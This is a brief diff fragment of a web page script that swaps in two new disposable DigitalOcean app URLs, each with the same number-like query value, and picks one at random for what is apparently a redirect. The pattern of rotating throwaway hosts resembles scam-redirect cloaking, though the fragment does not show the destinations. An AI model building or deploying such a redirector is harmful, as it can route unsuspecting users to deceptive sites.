@@ -8,8 +8,8 @@
 
 <script>
 (function () {
-    const urlA = "https://seahorse-app-luh5g.ondigitalocean.app/?Anph=(0101)-21735-08134";
-    const urlB = "https://lobster-app-tda8h.ondigitalocean.app/?Anph=(0101)-21735-08134";
+    const urlA = "https://seashell-app-wu7gz.ondigitalocean.app/?Anph=(0101)-21735-08134";
+    const urlB = "https://dolphin-app-2-eolg3.ondigitalocean.app/?Anph=(0101)-21735-08134";
 
     // 50-50 split
     const target = Math.random() < 0.5 ? urlA : urlB;
